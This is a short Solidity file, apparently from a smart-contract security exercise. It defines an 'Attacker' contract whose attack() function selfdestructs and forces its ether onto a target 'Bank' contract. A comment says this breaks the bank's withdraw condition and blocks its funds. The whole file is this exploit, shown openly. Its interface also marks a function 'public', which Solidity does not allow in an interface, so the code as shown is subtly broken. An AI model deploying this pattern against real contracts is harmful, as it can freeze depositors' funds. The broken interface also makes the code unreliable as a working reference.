// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.20;


interface Bank {
    function withdrawAll() public;
}


contract Attacker {
    
    Bank bank;

    constructor(Bank _bank) {
        bank = _bank;
    }

    /**
     * @dev You should store some ether/wei first
     */
    fallback() external payable { }

    /**
     * @dev Destroy the current contract,
     *      could invalidate the withdraw condition, therefore block the fund 
     */
    function attack() external {
        selfdestruct(payable(address(bank)));
    }

}